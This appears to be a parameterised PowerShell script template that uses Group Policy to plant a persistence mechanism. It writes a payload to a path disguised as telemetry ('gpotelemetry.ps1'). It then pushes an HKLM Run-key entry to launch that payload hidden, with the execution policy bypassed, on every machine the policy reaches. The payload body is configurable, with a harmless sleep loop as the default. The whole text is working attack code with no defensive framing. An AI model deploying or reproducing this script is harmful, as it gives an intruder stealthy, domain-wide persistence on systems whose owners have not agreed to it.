script:
if (-not $GPO_NAME) { throw 'GPO_NAME is required' }
if (-not $RUN_VALUE_NAME) { throw 'RUN_VALUE_NAME is required' }
Import-Module GroupPolicy -ErrorAction Ignore
$gpo = Get-GPO -Name $GPO_NAME -ErrorAction Ignore
if (-not $gpo) { $gpo = New-GPO -Name $GPO_NAME }
$path = if ($PAYLOAD_PATH) { $PAYLOAD_PATH } else { 'C:\ProgramData\Subsystems\gpotelemetry.ps1' }
$body = if ($PAYLOAD_BODY) { $PAYLOAD_BODY } else { 'while ($true) { Start-Sleep -Seconds 300 }' }
$dir = Split-Path -Path $path -Parent
if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
Set-Content -Path $path -Value $body -Encoding UTF8
Set-GPRegistryValue -Name $GPO_NAME -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName $RUN_VALUE_NAME -Type String -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$path`"" | Out-Null
